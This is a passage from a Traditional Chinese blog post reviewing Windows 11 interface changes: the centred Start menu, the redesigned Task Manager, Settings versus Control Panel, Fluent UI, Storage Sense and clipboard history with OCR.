的亮點之一，但保持操作的一致性對於老用戶來說更為重要。微軟應考慮提供一個平衡方案，既能保留新界面的美觀，又不會破壞用戶習慣。</li></ol><p>Windows 11 在提升美學和視覺效果的同時，也帶來了操作流程的變革。對於長期使用者來說，這樣的變化無疑帶來了不小的挑戰，尤其是右鍵選單的簡化。</p><p>然而，透過「顯示其他選項」等功能，微軟也給予了用戶一定的適應空間。在未來的更新中，微軟應該更加重視用戶的需求與回饋，在美學與實用性之間找到更好的平衡，從而進一步提升 Windows 11 的使用者體驗。</p><h2 id="Windows-11-開始選單跑到中間了"><a href="#Windows-11-開始選單跑到中間了" class="headerlink" title="Windows 11 開始選單跑到中間了"></a>Windows 11 開始選單跑到中間了</h2><p>不管是從哪個版本的 window 升級，一打開的驚喜就是，天啊，選單跑到中間了。</p><p>隨著 Windows 11 的推出，最引人注目的變化之一就是開始選單的位置從傳統的左下角移動到了畫面中央。</p><p>對於長期使用 Windows 的用戶來說，這樣的改動可能帶來了不少困惑與不便，特別是習慣了十多年舊版 Windows 介面的使用者。</p><h3 id="為什麼選擇將開始選單移到中間？"><a href="#為什麼選擇將開始選單移到中間？" class="headerlink" title="為什麼選擇將開始選單移到中間？"></a>為什麼選擇將開始選單移到中間？</h3><p>微軟的設計團隊將開始選單置中，似乎是為了追求更現代的外觀和統一的設計風格。這一變化與現代設備的多樣化螢幕比例及觸控操作的趨勢密切相關。</p><p>將選單置中能夠在不同尺寸的螢幕上提供一種更加對稱、視覺上平衡的效果，尤其是在觸控螢幕設備上使用時，將選單置中可能會帶來更加直觀的操作體驗。</p><p>然而，對於習慣了舊版 Windows 左下角開始選單的使用者來說，這樣的改動就成了一種顯著的心理衝擊。</p><h3 id="與舊版-Windows-比較：為何不習慣？"><a href="#與舊版-Windows-比較：為何不習慣？" class="headerlink" title="與舊版 Windows 比較：為何不習慣？"></a>與舊版 Windows 比較：為何不習慣？</h3><p>無論是 Windows 7 還是 Windows 10，用戶早已習慣將開始選單放置於螢幕左下角，這是許多年的使用習慣。</p><p>對於那些習慣了這種排列的用戶而言，每次尋找開始選單時都會不自覺地朝左下角移動，但 Windows 11 卻將它放置在了中間，這不僅是視覺上的調整，更是一種使用體驗上的顛覆。</p><p>當我們用習慣了十年的方式去操作，卻突然發現操作界面完全改變，這對許多人來說可能會產生困惑，特別是在工作環境中，每個不必要的變動都可能影響到工作效率。</p><p>尤其是對於年長用戶或那些習慣於固定工作方式的員工，這樣的變化可能會造成短期的效率下降。</p><p>對於一個超過上萬人的公司來說，尤其是年長的員工，這樣的突如其來的變化可能會造成工作效率的下降，甚至引發不必要的困惑。</p><p>這個部分不得不誇獎小編的公司，在小編的公司也強迫大家更新 Windows 11 時，竟然有先把預設的位置設定回熟悉的左下角，畢竟也是個超過上萬人的公司 (長輩也非常的多)，突如其來的使用者體驗改變其實真的會讓大家措手不及。</p><h3 id="Windows-11-vs-macOS：兩大操作系統的選單設計差異"><a href="#Windows-11-vs-macOS：兩大操作系統的選單設計差異" class="headerlink" title="Windows 11 vs macOS：兩大操作系統的選單設計差異"></a>Windows 11 vs macOS：兩大操作系統的選單設計差異</h3><p>如果我們再將目光投向蘋果的 macOS 系統，會發現其設計理念與 Windows 11 有些相似，也有顯著不同。macOS 一直以來都將應用程式的啟動器（Dock）放置在螢幕的底部，而其選單欄則是始終固定在螢幕的最上方。</p><p>這種固定式的選單設計與 Windows 11 的中央對齊相比，提供了不同的用戶體驗：macOS 注重的並非頻繁調整選單位置，而是始終如一的設置讓用戶能夠更快地適應。</p><p>此外，macOS 的觸控和視覺設計也強調直觀和簡化，對比於 Windows 11 的較大視覺調整和對稱設計，macOS 通常提供較少的選項來改變選單的佈局，這樣做有助於減少用戶在操作過程中的迷惑感。</p><h3 id="Windows-11-開始選單大升級"><a href="#Windows-11-開始選單大升級" class="headerlink" title="Windows 11 開始選單大升級"></a>Windows 11 開始選單大升級</h3><p>Windows 11 開始功能表的設計相較於 Windows 10 發生了顯著變化。開始選單的設計從以往從過去原本滑鼠移過去就會自動展開的左右展開改為上下覆蓋式，新的開始功能表採用上下覆蓋式佈局，並將應用程式和快捷方式更加集中，提供更直觀的操作介面。這一變化不僅提升了<strong>觸控操作</strong>的便捷性，也改善了跨設備使用的整體體驗。</p><p>在 Windows 8 及 Windows 10 時期，微軟引入了 Metro UI（也稱為 Modern UI），這是一種強調簡潔、現代化的設計理念，並引入了動態磚（Live Tiles）。動態磚讓用戶可以自定義應用程式的顯示方式，並即時顯示有用資訊，這對於觸控設備來說是非常友好的設計。</p><p>然而，這一設計並不完全適合所有類型的使用者。特別是在桌面環境中，對於習慣傳統桌面操作的用戶來說，動態磚顯得過於繁雜且難以掌握，尤其是在鍵盤和滑鼠操作的環境下。因此，微軟決定將這一設計進行優化，並將其轉型為 Fluent UI，也就是拿掉了動態磚的設計。</p><h3 id="如何適應-Windows-11-開始選單的變化"><a href="#如何適應-Windows-11-開始選單的變化" class="headerlink" title="如何適應 Windows 11 開始選單的變化"></a>如何適應 Windows 11 開始選單的變化</h3><p>雖然 Windows 11 將選單位置改為中央、動態磚的消失讓一些長期使用者感到不便，但 Windows 11 仍然提供了豐富的個人化選項來幫助使用者適應新的界面。</p><p>如何調整開始選單以符合個人需求：</p><ol><li>調整工作列行為:<ul><li>對開始列按右鍵，選擇工作列設定</li><li><img src="https://ithelp.ithome.com.tw/upload/images/20241110/20130026ebCI2i2KnY.png" alt="https://ithelp.ithome.com.tw/upload/images/20241110/20130026ebCI2i2KnY.png"></li><li>展開工作列行為：在設定選項中找到「工作列行為」</li><li>選擇靠左對齊：在「工作列對齊」中選擇「靠左」</li><li><img src="https://ithelp.ithome.com.tw/upload/images/20241110/201300260ctG6mA3mB.png" alt="https://ithelp.ithome.com.tw/upload/images/20241110/201300260ctG6mA3mB.png"></li></ul></li><li>調整應用程式顯示方式：<ul><li>右鍵點擊開始選單空白處，選擇「開始設定」。</li><li><img src="https://ithelp.ithome.com.tw/upload/images/20241110/20130026ivE1qavPnE.png" alt="https://ithelp.ithome.com.tw/upload/images/20241110/20130026ivE1qavPnE.png"></li><li>在「個人化」選項中，調整應用程式的顯示方式和排列。</li></ul></li><li>應用程式群組：<ul><li>將常用應用程式拖放到一起，創建自己的資料夾，以便更快找到所需程式。</li></ul></li><li>透明背景與主題設定：<ul><li>可以根據個人喜好，選擇深色模式或淺色模式，並調整開始選單的背景透明度，選擇自己喜歡的主題色彩。</li></ul></li><li>關閉多餘的廣告：<ul><li>可以依照需求把建議、最近開啟的 Apps 都關掉，可以讓版面更簡潔</li><li><img src="https://ithelp.ithome.com.tw/upload/images/20241110/20130026UXRbM0ihfn.png" alt="https://ithelp.ithome.com.tw/upload/images/20241110/20130026UXRbM0ihfn.png"></li></ul></li></ol><p>這樣一來，使用者就能夠重新找回熟悉的操作方式，減少因介面變動帶來的困擾。</p><h3 id="未來的期待：希望更多靈活的自定義選項"><a href="#未來的期待：希望更多靈活的自定義選項" class="headerlink" title="未來的期待：希望更多靈活的自定義選項"></a>未來的期待：希望更多靈活的自定義選項</h3><p>目前，Windows 11 並不支援將工作列置於螢幕左側、右側或上方的功能，這對某些用戶而言可能是一個遺憾。尤其是對於喜歡自訂介面的使用者來說，這樣的功能可以極大地提升操作的便利性。</p><p>我們期待微軟能夠聆聽用戶的反饋，並在未來的更新中加入更多的排版自定義選項，讓使用者能夠根據個人的需求進行更細緻的調整。</p><p>在科技日新月異的今天，操作系統的設計不僅要追求美觀，還必須兼顧使用者的需求。對於 Windows 11 和其他操作系統來說，未來的設計應該更加注重靈活性和自訂性，讓每位用戶都能在符合個人需求的環境中提高工作效率。</p><p>不管你是 Windows 的長期用戶，還是蘋果 macOS 的忠實擁護者，最終目標都是提供一個直觀、便捷且高效的使用體驗。</p><h2 id="Windows-11-工作管理員再進化"><a href="#Windows-11-工作管理員再進化" class="headerlink" title="Windows 11 工作管理員再進化"></a>Windows 11 工作管理員再進化</h2><p>隨著科技的快速發展，Windows 系統的工作管理員也進行了大規模的設計和功能升級。在 Windows 11 中，工作管理員不僅改變了外觀，還提升了使用者體驗和效能，讓現代使用者能夠更加高效地進行系統管理。本文將探討 Windows 11 中工作管理員的重大變革，以及它如何提高使用者操作效率和系統監控能力。</p><h3 id="工作管舊的簡單介面"><a href="#工作管舊的簡單介面" class="headerlink" title="工作管舊的簡單介面"></a>工作管舊的簡單介面</h3><p>在過去的 Windows 系統中，使用者經常透過快捷鍵 <code>Ctrl + Alt + Delete</code> 打開工作管理員，進行程式強制關閉、監控系統性能等操作。這成為了不少使用者熟悉的「密技」，但舊版工作管理員界面過於簡單，且功能呈現方式較為繁瑣，難以滿足現代使用者對高效管理和深入數據分析的需求。</p><p>舊版工作管理員的不足：</p><ol><li>操作界面簡單，但功能選項不夠直觀：對新手使用者來說，舊版工作管理員的選項較為隱蔽且繁雜，難以快速理解和操作。</li><li>缺乏詳細的硬體與軟體資訊：儘管可以進行程序監控，卻無法提供深入的系統健康狀況和性能資料，很多時候需要額外安裝第三方軟體來補充。</li><li>限制的跨設備體驗：舊版設計未能很好地適配觸控設備，對平板或其他觸控型裝置的支援較弱。</li></ol><p>如果你還是懷念舊版，其實微軟還是留有舊版的程式，位置在 <code>C:\Windows\SysWOW64\Taskmgr.exe</code>。</p><h3 id="Windows-11-全新升級工作管理員"><a href="#Windows-11-全新升級工作管理員" class="headerlink" title="Windows 11 全新升級工作管理員"></a>Windows 11 全新升級工作管理員</h3><p>Windows 11 中的工作管理員重新設計，從根本上改進了使用者體驗。新的設計使得它不僅適用於桌面電腦，還對觸控設備進行了優化。界面按鈕和選單的大小被調整為適合手指觸控的尺寸，使得觸控操作更加順暢。</p><p>新版工作管理員的主要特色：</p><ol><li>簡化的界面：新的工作管理員取消了繁雜的視覺元素，界面變得更加簡潔明了，將重要資訊清晰呈現。過去的「上下」操作順序被改為「左右」設計，符合現代化用戶界面風格，並更易於操作。</li><li>更詳盡的硬體與軟體監控資料：新版工作管理員提供了更多硬體性能的實時數據，包括 CPU 使用率、記憶體消耗、磁碟和網絡的使用情況，並且顯示更多關於應用程式的詳細資訊，使得使用者能夠更直觀地掌握系統健康狀況。</li><li>新增的效率模式：Windows 11 中引入了效率模式，允許用戶針對某些應用程式進行設置，將它們設為低資源占用的運行模式。這一設計特別有助於提升系統整體效率，對企業來說，這樣的設計在節省能源、提升工作效率方面具有顯著價值。特別是在 ESG（環境、社會與治理）議題日益受到重視的今天，這項功能對企業的碳排放管理尤為有益。</li></ol><p>效率模式的設置非常簡單，用戶只需右鍵點擊應用程式，選擇手動調整即可。這樣不僅幫助減少資源佔用，還能提升電池續航時間，對筆記型電腦或觸控設備用戶特別有用。</p><p><img src="https://ithelp.ithome.com.tw/upload/images/20241016/20130026kKkBLalpMS.png" alt="https://ithelp.ithome.com.tw/upload/images/20241016/20130026kKkBLalpMS.png"></p><p>作為前端工程師，對於 Windows 11 的工作管理員，我認為最大改進之一在於它如何通過精簡且一致的設計來提升使用者的整體體驗。新的設計使得工作管理員不僅在桌面電腦上操作順暢，還能在觸控設備上提供更為直觀的使用體驗。</p><p>此外，Windows 11 還加強了跨設備一致性，無論是桌面、筆記型電腦、平板或是觸控設備，用戶都可以在不同裝置之間無縫切換，進行操作和管理，這大大提升了工作流的效率和統一性。</p><p>新版工作管理員的使用者體驗提升要點：</p><ul><li>簡潔的操作界面：新版工作管理員的界面設計更加直觀，使用者可以輕鬆定位所需功能，提升操作效率。</li><li>自動資源管理：通過效率模式和資源優化，Windows 11 能夠讓系統在不犧牲性能的情況下，最大限度減少資源占用，這對於企業用戶來說，尤其是在多任務處理時具有顯著的好處。</li><li>跨設備無縫操作：無論是在筆記型電腦、平板還是觸控設備上，Windows 11 的工作管理員都能提供一致的使用體驗，使用者可以隨時隨地進行管理和監控。</li></ul><p>未來的工作管理員，期待會更高效、更智慧，Windows 11 的工作管理員改進了傳統的設計，融入了更多現代化的設計元素和智能功能，提升了操作流暢度和資源管理效率。</p><p>無論是個人用戶還是企業用戶，都能從中受益，特別是在多設備協作和資源優化方面。未來，微軟可能會進一步完善工作管理員的功能，例如引入更多基於人工智慧的性能預測或更加智能的資源分配策略，為用戶提供更加高效、靈活的操作體驗。</p><h2 id="從控制台到設定頁面，熟悉的操作被打亂"><a href="#從控制台到設定頁面，熟悉的操作被打亂" class="headerlink" title="從控制台到設定頁面，熟悉的操作被打亂"></a>從控制台到設定頁面，熟悉的操作被打亂</h2><p>身為一個容易被知識綁架的工程師，改版後的設定界面在工作上做系統管理和設定時的確會感到不適應。作為一個長期使用 Windows 系統的用戶，特別是對於工程師或系統管理員來說，Windows 11 的設定界面變化確實帶來了不小的挑戰。</p><p>即使是在 Windows 10 中，看得出來設定頁面打開是對已經存在超過十年的控制台的致敬:</p><p><img src="https://ithelp.ithome.com.tw/upload/images/20241013/20130026aKUL4Zjd8A.png" alt="https://ithelp.ithome.com.tw/upload/images/20241013/20130026aKUL4Zjd8A.png"></p><p><img src="https://ithelp.ithome.com.tw/upload/images/20241014/20130026TtKHme1lzM.png" alt="https://ithelp.ithome.com.tw/upload/images/20241014/20130026TtKHme1lzM.png"></p><p>以往，使用控制台可以輕鬆找到許多系統設定，像是網路設定、硬體管理等。然而在 Windows 11 中，這些選項被重新分類，許多功能被移到新的「設定」頁面，這使得習慣了舊版介面的使用者需要花更多時間去尋找相同的選項。</p><p>以網路設定為例，原本透過控制台的快速切換顯示模式，操作非常直觀能夠快速地通過控制台找到網路設定，但在 Windows 11 中，許多設定被細分並放在不同的頁面，這讓使用者在快速進行日常管理時需要付出更多的精力。</p><h3 id="傳統控制台-vs-Windows-11-設定"><a href="#傳統控制台-vs-Windows-11-設定" class="headerlink" title="傳統控制台 vs Windows 11 設定"></a>傳統控制台 vs Windows 11 設定</h3><p>在 Windows 10 中，控制台介面通常是上下排列的結構，選項清晰可見，讓使用者能夠迅速找到所需功能。然而，在 Windows 11 中，設定頁面已經進化成左側固定選單的形式，這樣的設計視覺上更加現代化，但對於習慣舊版控制台的用戶來說，卻帶來了不小的學習曲線。</p><p>在 Windows 10 進入設定後，其實會發現底層的選單實際上就是這次 Windows 11 設定界面的左右排列格式。</p><p><img src="https://ithelp.ithome.com.tw/upload/images/20241013/20130026xEigWC1wJd.png" alt="https://ithelp.ithome.com.tw/upload/images/20241013/20130026xEigWC1wJd.png"></p><p>Windows 11 重新設計的設定，目前具備常駐的固定左側選單，使得更容易從一堆設定中瀏覽至另一組設定。這次更新淘汰了傳統控制台的主選單，統一改為新的設計體驗。</p><p><img src="https://ithelp.ithome.com.tw/upload/images/20241014/20130026FBuWRndRMl.png" alt="https://ithelp.ithome.com.tw/upload/images/20241014/20130026FBuWRndRMl.png"></p><p>這在視覺上看起來更現代，但卻造成些微不方便，像是需要移除軟體時，曾經能輕鬆找到控制台的程式和功能移除選項，現在這個功能被隱藏在新的設定界面中。</p><p>過去，像是「程式和功能」這類的設定項目在控制台中是極為顯眼的，使用者只需進入控制台即可輕鬆找到移除軟體的選項。但在 Windows 11 中，這些功能被隱藏在新的「設定」界面中，讓許多用戶感到困惑。</p><h3 id="隱藏的選項，如何快速找到所需設定？"><a href="#隱藏的選項，如何快速找到所需設定？" class="headerlink" title="隱藏的選項，如何快速找到所需設定？"></a>隱藏的選項，如何快速找到所需設定？</h3><p>Windows 11 的設定界面不僅是視覺上的更新，更帶來了操作方式上的根本改變。許多曾經清晰顯示在控制台中的功能，如程式管理、硬體設置等，現在都需要通過更多層級的導航才能找到。這樣的改動無疑會讓習慣舊版介面的用戶感到不便，尤其是在日常管理或快速處理問題時。</p><p>此外，對於需要高效操作的使用者來說，尋找特定功能的時間增加了，這對工作效率帶來了挑戰。例如，要移除一個程式，過去只需進入控制台並點擊「程式和功能」，但現在需要更多步驟來尋找相應的選項。</p><p>Windows 11 在界面設計上無疑追求了現代感和簡潔性，這個部份即使改變很大但仍然保有舊版的介面可供使用，只需要在搜尋輸入 Control Panel 就可以打開熟悉的畫面。</p><h2 id="Windows-11-設計大變革-Fluent-UI-的崛起，統一多設備體驗"><a href="#Windows-11-設計大變革-Fluent-UI-的崛起，統一多設備體驗" class="headerlink" title="Windows 11 設計大變革: Fluent UI 的崛起，統一多設備體驗"></a>Windows 11 設計大變革: Fluent UI 的崛起，統一多設備體驗</h2><p>Windows 11 的全新設計將過去的 Metro UI 捨棄，取而代之的是更現代化、更具流暢感的 Fluent UI 設計語言。這一設計不僅改善了 Windows 11 介面的視覺效果，還優化了跨設備的使用體驗，尤其是對觸控裝置的支援更加完善。Fluent UI 強調柔和的圓角、過渡動畫與透明效果，使整個系統看起來更加簡潔、現代且具有動感。</p><p>Fluent UI 是微軟為了實現跨設備一致性而推動的設計語言，旨在讓 Windows 11 在桌面、筆記型電腦、平板以及手機等不同裝置上都能提供統一且高效的使用者體驗。這樣的設計不僅注重視覺美感，還加強了操作的流暢性與互動感，使得用戶在任何裝置上都能享有直觀的操作體驗。</p><h3 id="Fluent-UI-與-Metro-UI-的區別"><a href="#Fluent-UI-與-Metro-UI-的區別" class="headerlink" title="Fluent UI 與 Metro UI 的區別"></a>Fluent UI 與 Metro UI 的區別</h3><ul><li>Metro UI 的設計強調扁平化和直線邊角，而 Fluent UI 則採用了圓角設計和透明玻璃效果，讓使用者有更柔和、舒適的視覺感受。</li><li>Fluent UI 的介面過渡更加自然，並加強了對觸控操作的支持，特別適合<strong>二合一裝置</strong>和<strong>平板電腦</strong>的使用。</li></ul><h3 id="Metro-UI-的回顧：Windows-8-和-10-的創新與挑戰"><a href="#Metro-UI-的回顧：Windows-8-和-10-的創新與挑戰" class="headerlink" title="Metro UI 的回顧：Windows 8 和 10 的創新與挑戰"></a>Metro UI 的回顧：Windows 8 和 10 的創新與挑戰</h3><p>在 Windows 8 及 Windows 10 時期，微軟引入了 Metro UI（也稱為 Modern UI），這是一種強調簡潔、現代化的設計理念，並引入了動態磚（Live Tiles）。動態磚讓用戶可以自定義應用程式的顯示方式，並即時顯示有用資訊，這對於觸控設備來說是非常友好的設計。</p><p>然而，這一設計並不完全適合所有類型的使用者。特別是在桌面環境中，對於習慣傳統桌面操作的用戶來說，動態磚顯得過於繁雜且難以掌握，尤其是在鍵盤和滑鼠操作的環境下。因此，微軟決定將這一設計進行優化，並將其轉型為 Fluent UI。</p><h3 id="Fluent-UI-的引入：流暢的現代化體驗"><a href="#Fluent-UI-的引入：流暢的現代化體驗" class="headerlink" title="Fluent UI 的引入：流暢的現代化體驗"></a>Fluent UI 的引入：流暢的現代化體驗</h3><p>Fluent UI 帶來了更加注重視覺層次感的設計語言。與 Metro UI 的扁平化設計相比，Fluent UI 不僅強調視覺上的一致性，還提升了操作的流暢性和自然感。這些變化不僅體現在界面的設計上，還進一步優化了跨設備的使用體驗，從桌面到觸控設備，每一個操作都更加直觀和舒適。</p><p>Fluent UI 主要特點：</p><ul><li>統一的控制元件樣式：無論在桌面端還是觸控設備上，Fluent UI 都提供統一的外觀和操作體驗，這樣用戶可以在不同裝置間無縫切換。</li><li>視覺一致性：Fluent UI 強調顏色、邊界和陰影等視覺元素的一致性，使得使用者在跨裝置操作時，能夠獲得一致的使用體驗。</li><li>觸控友好：Fluent UI 特別針對觸控設備進行了優化，這使得 Windows 11 在平板和觸控屏設備上有了更佳的操作體驗。</li></ul><h3 id="從動態磚到簡化的應用程式列表"><a href="#從動態磚到簡化的應用程式列表" class="headerlink" title="從動態磚到簡化的應用程式列表"></a>從動態磚到簡化的應用程式列表</h3><p>Windows 11 的開始選單是 Fluent UI 設計語言的一個重要實踐。微軟將 Windows 10 中的動態磚移除，並將開始選單簡化為一個置中的、線性化的應用程式列表。這樣的設計方式，與 Android 和 iOS 中的應用程式管理方式類似，讓用戶在不同設備間的操作體驗更加一致。</p><p>主要變化：</p><ul><li>應用程式群組：開始選單不再顯示動態磚，而是將應用程式以簡單的圖示顯示，並允許使用者將應用程式整理成資料夾或群組。這樣的設計更符合現代化需求，讓用戶可以根據自己的需求自由安排應用程式。</li><li>簡化的布局：與 Windows 10 的動態磚相比，Windows 11 的開始選單變得更加簡潔，去除了多餘的動態元素，專注於應用程式展示和快捷操作。</li><li>動態效果與透明背景：Fluent UI 的設計加入了更多透明度和模糊效果，讓選單背景與操作界面之間的過渡更具視覺深度，提升了整體的操作流暢感。</li></ul><h3 id="Windows-11-圓角設計：視覺效果的升級"><a href="#Windows-11-圓角設計：視覺效果的升級" class="headerlink" title="Windows 11 圓角設計：視覺效果的升級"></a>Windows 11 圓角設計：視覺效果的升級</h3><p>Windows 11 的圓角設計給作業系統增添了柔和感，尤其在視窗設計和應用程式介面中更加突出。圓角設計提升了 現代感，並讓使用者在視覺上感到更舒適。然而，對於一些舊款硬體來說，這些視覺效果可能會對 效能 造成一定影響。</p><h2 id="Windows-11-儲存空間管理工具"><a href="#Windows-11-儲存空間管理工具" class="headerlink" title="Windows 11 儲存空間管理工具"></a>Windows 11 儲存空間管理工具</h2><p>隨著數位時代的進步，儲存空間管理已經成為提高系統性能和維持設備流暢運行的重要一環。</p><p>Windows 11 在這方面的表現可謂超乎預期，它的儲存空間管理功能不僅進化了介面，還加入了多項智慧化功能就像空間魔術師，讓使用者能夠像操作行動裝置一樣輕鬆管理儲存空間，我們就不用再額外安裝像是 ccleaner 這樣的優化軟體。</p><h3 id="全新設計的儲存空間管理介面"><a href="#全新設計的儲存空間管理介面" class="headerlink" title="全新設計的儲存空間管理介面"></a>全新設計的儲存空間管理介面</h3><p>在 Windows 10 中，儲存空間管理雖然也已經有了基本功能，但操作介面略顯繁瑣，需要額外的第三方工具來進行優化。而在 Windows 11 中，這一點得到了顯著改進。儲存空間管理的介面經過重新設計，變得更加直觀，讓使用者可以輕鬆管理自己的檔案和磁碟空間，無需額外安裝如 CCleaner 等工具。</p><p><img src="https://ithelp.ithome.com.tw/upload/images/20241026/20130026RVUWqgk8Zp.png" alt="https://ithelp.ithome.com.tw/upload/images/20241026/20130026RVUWqgk8Zp.png"></p><p>進入 「設定」 &gt; 「系統」 &gt; 「儲存空間」，使用者就可以清楚地看到當前儲存空間的使用狀況，並且每個檔案類別（如應用程式、文件、圖片等）都會以清晰的圖表形式展示出來。這樣的設計讓使用者一目瞭然，便於快速找出佔用空間的主要原因。</p><p><img src="https://ithelp.ithome.com.tw/upload/images/20241026/201300260fLFU4i9j1.png" alt="https://ithelp.ithome.com.tw/upload/images/20241026/201300260fLFU4i9j1.png"></p><h3 id="空間管理工具：簡單直觀，隨時清理"><a href="#空間管理工具：簡單直觀，隨時清理" class="headerlink" title="空間管理工具：簡單直觀，隨時清理"></a>空間管理工具：簡單直觀，隨時清理</h3><p>Windows 11 的 儲存空間管理工具，不僅簡化了磁碟清理的操作，還提供了更多強大的選項。您不再需要依賴外部工具來釋放空間，現在一切都可以在操作系統內輕鬆完成。</p><p>只需進入設定中的儲存空間選項，然後選擇需要清理的項目即可。這包括應用程式、臨時檔案、下載資料夾等，使用者可以輕鬆管理各類資料，清理不再需要的檔案。</p><h3 id="進階設定與自動化功能：儲存空間感知器"><a href="#進階設定與自動化功能：儲存空間感知器" class="headerlink" title="進階設定與自動化功能：儲存空間感知器"></a>進階設定與自動化功能：儲存空間感知器</h3><p>Windows 11 引入了更為強大的 儲存空間感知器 功能，讓儲存空間管理變得更加智能。當系統發現儲存空間不足時，儲存空間感知器會自動釋放空間，並且根據使用者的需求自動清理不必要的檔案，極大地減少了用戶的手動操作。</p><ul><li>自動清理功能： 開啟儲存空間感知器後，系統會在磁碟空間不足時自動執行清理，清除暫存檔案和不必要的系統文件，讓用戶無需親自進行操作 (僅適用系統磁碟機通常為 C:)。</li><li>資源回收桶管理： 預設情況下，儲存空間感知器會定期清理資源回收桶中的檔案，並根據設定的時間（例如 30 天未使用的檔案）自動刪除。這樣可以避免資源回收桶中堆積過多無用檔案，佔用寶貴的儲存空間。</li></ul><p>系統的假設是我們下載、丟到資源回收桶的東西其實長期來看都是不被需要的，如果可以被下載那就代表網路有來源，如果在垃圾桶超過幾天，那我們這輩子也許都不會再去翻閱。</p><p>其中，儲存空間感知器是一個強大的功能，能根據使用者的需求自動調整儲存設置，當系統檢測到儲存空間不足時會自動釋放空間，並通知用戶進行進一步的清理。</p><p><img src="https://ithelp.ithome.com.tw/upload/images/20241026/201300264PkXJGwIf4.png" alt="https://ithelp.ithome.com.tw/upload/images/20241026/201300264PkXJGwIf4.png"></p><h3 id="如何啟用儲存空間感知器？"><a href="#如何啟用儲存空間感知器？" class="headerlink" title="如何啟用儲存空間感知器？"></a>如何啟用儲存空間感知器？</h3><p>啟用儲存空間感知器非常簡單，按以下步驟操作：</p><ol><li>在 Windows 搜尋欄 輸入「開啟儲存空間感知器」，然後點選 「開啟」。</li><li>點選 「儲存空間感知器」，然後勾選 「清理暫存檔案」 和 「自動清理使用者內容」。</li><li>設定清理排程：選擇執行儲存空間感知器的頻率（例如，每月一次或每週一次）。</li><li>可以選擇刪除<strong>資源回收桶</strong>和<strong>下載</strong>資料夾 中，超過設定天數未開啟的檔案。</li><li>點擊 「立即執行儲存空間感知器」，讓系統立即釋放磁碟空間。</li></ol><p><img src="https://ithelp.ithome.com.tw/upload/images/20241026/20130026fgAyWXemjr.png" alt="https://ithelp.ithome.com.tw/upload/images/20241026/20130026fgAyWXemjr.png"></p><p><img src="https://ithelp.ithome.com.tw/upload/images/20241110/20130026fO1xpiX3Uq.png" alt="https://ithelp.ithome.com.tw/upload/images/20241110/20130026fO1xpiX3Uq.png"></p><h3 id="Windows-11-讓空間管理變得更簡單"><a href="#Windows-11-讓空間管理變得更簡單" class="headerlink" title="Windows 11 讓空間管理變得更簡單"></a>Windows 11 讓空間管理變得更簡單</h3><p>Windows 11 讓儲存空間管理變得更簡單、更智能，特別是 儲存空間感知器 功能，能夠根據使用情況自動釋放空間，讓用戶無需手動處理。而直觀的介面和進階設定功能，也讓管理檔案變得更加高效，能夠確保系統運行更加流暢。</p><p>無論是對個人使用者還是專業人士來說，Windows 11 的儲存空間管理功能無疑是一大亮點，它將儲存空間清理變得更加輕鬆，讓用戶能夠專注於更重要的工作，無需擔心磁碟空間不足的問題。</p><h2 id="Windows-11-剪貼簿無限閱讀"><a href="#Windows-11-剪貼簿無限閱讀" class="headerlink" title="Windows 11 剪貼簿無限閱讀"></a>Windows 11 剪貼簿無限閱讀</h2><p>Windows 11 的剪貼簿功能經過大幅升級，提供了全新的<strong>剪貼簿歷史記錄</strong>、<strong>雲端同步</strong>、<strong>OCR 文字識別技術</strong>等強大功能，讓這個日常工具不僅能夠儲存複製內容，還能提高工作效率並支援跨設備協同作業。</p><p>透過 OCR 技術，用戶可以輕鬆從圖片中提取文字，配合雲端同步功能，無論在哪台設備上都能隨時存取內容，實現高效的數位化工作流程。</p><p>此外，Windows 11 剪貼簿還支援以圖搜圖功能，讓管理多格式內容變得更加靈活智能。這些創新功能不僅提升了剪貼簿的便利性，還幫助用戶更加高效地處理各類內容，無論是文字還是圖片，讓數位工作更上一層樓。</p><h3 id="剪貼簿歷史：無限閱讀"><a href="#剪貼簿歷史：無限閱讀" class="headerlink" title="剪貼簿歷史：無限閱讀"></a>剪貼簿歷史：無限閱讀</h3><p>在 Windows 11 中，啟用<strong>剪貼簿歷史</strong>功能後，您可以儲存多筆複製的內容，取代了過去只能保存最後一個複製項目的限制。這不僅提升了複製和貼上的便捷性，也讓工作流程變得更加高效。</p><ul><li>同步功能：當您登錄 Microsoft 帳戶後，剪貼簿的內容可以在不同設備之間進行同步。無論您是在桌面電腦、筆記型電腦還是平板上操作，隨時隨地都能查看自己的剪貼簿歷史，保持一致的工作體驗。</li><li>資料保留：即使重啟電腦，剪貼簿中的內容也會被保留，不會丟失任何重要的資料。這樣您可以放心記錄工作中的靈感或待辦事項，隨時使用。</li></ul><p><img src="https://ithelp.ithome.com.tw/upload/images/20241028/201300263kf5XiYaY1.png" alt="https://ithelp.ithome.com.tw/upload/images/20241028/201300263kf5XiYaY1.png"></p><h3 id="OCR-文字辨識技術：從圖片中提取文字"><a href="#OCR-文字辨識技術：從圖片中提取文字" class="headerlink" title="OCR 文字辨識技術：從圖片中提取文字"></a>OCR 文字辨識技術：從圖片中提取文字</h3><p>Windows 11 剪貼簿的進階功能之一是 OCR（光學字符識別）技術，這使得剪貼簿不僅僅是文字與圖片的儲存工具，它還可以自動識別圖片中的文字，並將其轉換為可編輯的文本。這一功能對於處理含有文字的圖片非常有幫助，無論是文件、照片還是手寫筆記，都能夠輕鬆轉換為可編輯的文字。</p><p><img src="https://ithelp.ithome.com.tw/upload/images/20241109/2013002635ERUhL4Fd.png" alt="https://ithelp.ithome.com.tw/upload/images/20241109/2013002635ERUhL4Fd.png"></p><p>Text Actions（文字操作）：剪貼簿中的 OCR 功能與 text actions 技術相結合，讓用戶可以在剪貼簿中輕鬆執行文字操作，例如選擇、複製或編輯圖片中的文字。</p><p><img src="https://ithelp.ithome.com.tw/upload/images/20241109/20130026mtfxnJ9rFe.png" alt="https://ithelp.ithome.com.tw/upload/images/20241109/20130026mtfxnJ9rFe.png"></p><h3 id="剪貼簿結合-Bing-的以圖搜圖-Visual-Search"><a href="#剪貼簿結合-Bing-的以圖搜圖-Visual-Search" class="headerlink" title="剪貼簿結合 Bing 的以圖搜圖 (Visual Search)"></a>剪貼簿結合 Bing 的以圖搜圖 (Visual Search)</h3><p>除了 OCR 功能，Windows 11 剪貼簿還整合了 Bing 的以圖搜圖（Visual Search）功能。這項新功能可以讓您通過圖像識別找到相關的資訊，無論是產品、名人還是地點，都能快速獲取與圖像相關的網頁或資料。</p><p><img src="https://ithelp.ithome.com.tw/upload/images/20241109/20130026nJU4Ga6HP7.png" alt="https://ithelp.ithome.com.tw/upload/images/20241109/20130026nJU4Ga6HP7.png"></p><h3 